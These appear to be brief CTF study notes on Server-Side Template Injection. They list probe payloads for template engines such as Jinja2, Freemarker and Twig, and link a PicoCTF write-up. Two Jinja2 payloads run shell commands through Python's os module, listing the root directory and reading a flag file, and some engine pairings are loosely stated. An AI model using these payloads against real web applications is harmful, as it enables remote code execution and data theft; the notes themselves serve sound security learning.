## SSTI
There are somethings that need to be remembered:
1. Short for Server-Side Template Injection. It happens when a web application lets users to submit data that gets processed by a template engine on the server without proper validation.
2. Template engines are used to generate dynamic content.
3. Common template engines and their corresponding test payloads:
    Jinja2 (Python Flask/Django): {{ 7*7 }}
    Freemarker (Java): ${7*7}
    Velocity (Java): #set($a = 7*7)${a}
    Thymeleaf (Java): ${7*7}
    Twig (PHP Symfony): {{ 7*7 }}
    Smarty (PHP): {$7*7}
    Mako (Python): <% print 7*7 %>
4. https://anudeepreddy.dev/notes/Challenges/PicoCTF/2025/SSTI1
5. {{request.application.__globals__.__builtins__.__import__('os').popen('ls /').read()}}
6. {{request.application.__globals__.__builtins__.__import__('os').popen('cat /challenge/flag').read()}}
